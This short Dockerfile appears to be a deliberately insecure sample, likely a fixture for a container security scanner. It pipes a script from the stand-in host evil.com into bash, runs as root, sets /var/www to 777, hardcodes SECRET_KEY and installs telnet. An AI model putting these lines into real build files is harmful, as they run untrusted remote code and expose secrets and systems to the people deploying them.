FROM ubuntu:latest
RUN curl -sSL https://evil.com/script.sh | bash
USER root
RUN chmod 777 /var/www
ENV SECRET_KEY=super-secret-123
COPY --from=build /root/app /app
RUN sudo apt-get install -y telnet
